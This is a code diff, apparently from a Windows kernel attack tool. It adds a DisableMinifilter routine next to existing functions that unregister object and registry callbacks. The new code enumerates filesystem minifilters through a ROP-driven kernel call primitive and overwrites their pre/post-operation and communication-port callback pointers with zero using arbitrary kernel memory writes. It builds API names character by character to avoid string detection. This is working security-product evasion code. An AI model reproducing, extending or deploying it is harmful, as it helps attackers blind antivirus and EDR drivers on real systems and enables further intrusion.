@@ -291,7 +291,6 @@ BOOL DisableObCallBack()
 			if (ObProcCallback.ListEntry.Flink && ObProcCallback.ObHandle)
 			{
 				Handles[count++] = (ULONG64)ObProcCallback.ObHandle;
-
 				//会蓝屏buffer over flow
 				//if (ObProcCallback.ObHandle)
 				//	 RemoveObCallback(ObProcCallback.ObHandle);
@@ -315,7 +314,6 @@ BOOL DisableObCallBack()
 			if (ObThreadCallback.ListEntry.Flink && ObThreadCallback.ObHandle)
 			{
 				Handles[count++] = (ULONG64)ObThreadCallback.ObHandle;
-
 				//if (ObThreadCallback.ObHandle)
 				//	RemoveObCallback(ObThreadCallback.ObHandle);
 				//ULONG64 zero = 0;
@@ -403,12 +401,134 @@ BOOL DisableCm()
 
 			if (NotifyEntry.ListEntryHead.Flink && NotifyEntry.Function && NotifyEntry.Cookie.QuadPart)
 				Handles[count++] = (ULONG64)NotifyEntry.Cookie.QuadPart;
-			
 		} while (pCallbackListHead != (ULONG64)NotifyEntry.ListEntryHead.Flink);
 	}
 
 	while (count)
 		CmUnRegisterCallback((PVOID)Handles[--count]);
 
+	return true;
+}
+
+//FltRegisterFilter
+void FltUnregisterFilter(PVOID Filter,ULONG64 flt)
+{
+	//FltUnregisterFilter
+	DWORD_PTR Status = NULL;
+	PVOID Args[] = { KF_ARG(Filter) };
+	char FltUnregisterFilterStr[] = { 'F','l','t','U','n','r','e','g','i','s','t','e','r','F','i','l','t','e','r','\0' };
+	PVOID FltUnregisterFilter = GetFltFuncOffset(FltUnregisterFilterStr, flt);
+	if (FltUnregisterFilter)
+	{
+		RopCallAddr(FltUnregisterFilter, Args, 1, KF_RET(&Status));
+	}
+}
+BOOL DisableMinifilter()
+{
+	ULONG64 flt = NULL;
+	LONG lOperationsOffset = 0;	//不支持win8，简单区分一下win7和win10
+	LONG lConnectionListOffset = 0;
+
+	if (IsMoreThanWin7())
+	{
+		char fltStr[] = { 'F','L','T','M','G','R','.','S','Y','S' ,'\0'};
+		flt = GetKernelBaseByName(fltStr);
+		lOperationsOffset = 0x1A8;
+		lConnectionListOffset = 0x208 + 0x38;
+	}
+	else
+	{	
+		char fltStr[] = { 'f','l','t','m','g','r','.','s','y','s' ,'\0' };
+		flt = GetKernelBaseByName(fltStr);
+		lOperationsOffset = 0x188;
+		lConnectionListOffset = 0x1e8 + 0x38;
+	}
+
+	if (!flt)
+		return false;
+
+	//FltEnumerateFilters
+	char emuFltStr[] = { 'F','l','t','E','n','u','m','e','r','a','t','e','F','i','l','t','e','r','s','\0'};
+	PVOID FltEnumerateFilters =GetFltFuncOffset(emuFltStr, flt);
+	if (!FltEnumerateFilters)
+		return false;
+
+	DWORD_PTR Status = NULL;
+	ULONG64 ulFilterListSize = 0;
+	PVOID Args[] = {	KF_ARG(0),
+						KF_ARG(0) ,
+						KF_ARG(&ulFilterListSize) };
+	RopCallAddr(FltEnumerateFilters, Args, 3, KF_RET(&Status));
+
+	if (!ulFilterListSize)
+		return false;
+
+	//FltEnumerateFilters twice
+	PULONG64 ppFilterList = NULL;
+	ppFilterList = (PULONG64)malloc(ulFilterListSize * sizeof(PVOID));
+	if (!ppFilterList)
+		return false;
+
+	PVOID Args_2[] = { KF_ARG(ppFilterList),
+						KF_ARG(ulFilterListSize) ,
+						KF_ARG(&ulFilterListSize) };
+	RopCallAddr(FltEnumerateFilters, Args_2, 3, KF_RET(&Status));
+
+	for (ULONG64 i = 0; i < ulFilterListSize; i++)
+	{
+		if (ppFilterList[i])
+		{
+			ULONG64	Operations = NULL;
+			ReadWriteVirtualAddressValue(ppFilterList[i] + lOperationsOffset, sizeof(ULONG64), &Operations, true);
+			if (Operations)
+			{
+				FLT_OPERATION_REGISTRATION FltOperationRegistration = { 0 };
+				ReadWriteVirtualAddressValue(Operations, sizeof(FLT_OPERATION_REGISTRATION), &FltOperationRegistration, true);
+
+				while (IRP_MJ_OPERATION_END != FltOperationRegistration.MajorFunction)
+				{
+					if (IRP_MJ_MAXIMUM_FUNCTION > FltOperationRegistration.MajorFunction)     // MajorFunction ID Is: 0~27
+					{
+						//pre & post
+						if (g_RopAddr_6)
+						{
+							//ReadWriteVirtualAddressValue(Operations + 0x8, sizeof(ULONG64), &g_RopAddr_6, false);
+							//ReadWriteVirtualAddressValue(Operations + 0x10, sizeof(ULONG64), &g_RopAddr_6, false);
+							ULONG64 zero = NULL;
+							ReadWriteVirtualAddressValue(Operations + 0x8, sizeof(ULONG64), &zero, false);
+							ReadWriteVirtualAddressValue(Operations + 0x10, sizeof(ULONG64), &zero, false);
+						}
+						//printf("FltOperationRegistration.MajorFunction %llX FltOperationRegistration.PreOperation %llX\n", FltOperationRegistration.MajorFunction, FltOperationRegistration.PreOperation);
+					}
+					Operations += sizeof(FLT_OPERATION_REGISTRATION);
+					ReadWriteVirtualAddressValue(Operations, sizeof(FLT_OPERATION_REGISTRATION), &FltOperationRegistration, true);
+				}
+			}
+			//FltUnregisterFilter((PVOID)ppFilterList[i],flt);
+
+			FLT_SERVER_PORT_OBJECT serverPort = { 0 };
+			ReadWriteVirtualAddressValue(ppFilterList[i] + lConnectionListOffset, sizeof(FLT_SERVER_PORT_OBJECT), &serverPort, true);
+			if (ppFilterList[i] + lConnectionListOffset != (ULONG64)serverPort.FilterLink.Flink) //FLT_SERVER_PORT_OBJECT
+			{
+				//printf("ppFilterList[i] %llX serverPort.FilterLink.Flink %llX \n", ppFilterList[i], serverPort.FilterLink.Flink);
+				do 
+				{
+					ULONG64 preServerObj = (ULONG64)serverPort.FilterLink.Flink;
+					ReadWriteVirtualAddressValue((ULONG64)serverPort.FilterLink.Flink,sizeof(FLT_SERVER_PORT_OBJECT) ,&serverPort,true);
+					//printf("\t serverPort.ConnectNotify  %llX serverPort.MessageNotify %llX \n", serverPort.ConnectNotify,serverPort.MessageNotify);
+
+					//ReadWriteVirtualAddressValue(preServerObj + 0x10, sizeof(ULONG64), &g_RopAddr_6, false);
+					//ReadWriteVirtualAddressValue(preServerObj + 0x18, sizeof(ULONG64), &g_RopAddr_6, false);
+					//ReadWriteVirtualAddressValue(preServerObj + 0x20, sizeof(ULONG64), &g_RopAddr_6, false);
+					ULONG64 zero = NULL;
+					ReadWriteVirtualAddressValue(preServerObj + 0x10, sizeof(ULONG64), &zero, false);
+					ReadWriteVirtualAddressValue(preServerObj + 0x18, sizeof(ULONG64), &zero, false);
+					ReadWriteVirtualAddressValue(preServerObj + 0x20, sizeof(ULONG64), &zero, false);
+					
+				} while (ppFilterList[i] + lConnectionListOffset != (ULONG64)serverPort.FilterLink.Flink);
+			}
+		}
+	}
+	free(ppFilterList);
 	return true;
 }
